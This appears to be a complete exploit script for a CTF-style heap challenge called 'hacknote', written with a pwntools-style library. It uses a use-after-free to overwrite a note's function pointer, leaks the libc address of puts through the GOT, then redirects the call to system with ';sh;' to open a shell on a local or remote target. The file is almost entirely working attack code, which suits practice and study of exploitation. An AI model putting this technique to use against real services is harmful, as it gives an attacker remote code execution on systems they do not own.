#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.6", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./hacknote_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(1)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg

b *0804869A
b *0x804872C
b *0x804893D
b *0x8048863
b *0x8048863

c
'''

p = start()

# ==================== EXPLOIT ====================

def choice(option: int):
    sna(b'choice :', option)


index = 0
def add(size, content):

    global index
    index += 1
    choice(1)
    sna(b'size :', size)
    sa(b'Content :', content)
    return index - 1


def delete(index):
    choice(2)
    sna(b'Index :', index)


def print(index):
    choice(3)
    sna(b'Index :', index)


def exploit():

    printFunc = 0x804862B

    chunkA = add(0x10, b'A'*4)      # index 0
    chunkB = add(0x10, b'B'*4)      # index 1
    
    delete(chunkA)
    delete(chunkB)

    chunkC = add(0x8, p32(printFunc) + p32(exe.got.puts))
    print(chunkA)

    puts = u32(rb(4))
    libc.address = puts - libc.sym.puts

    info('puts @ %#x', puts)
    success('libc base @ %#x', libc.address)

    delete(chunkC)
    chunkD = add(0x8, p32(libc.sym.system) + b';sh;\0')
    print(chunkA)


    interactive()

if __name__ == '__main__':
    exploit()
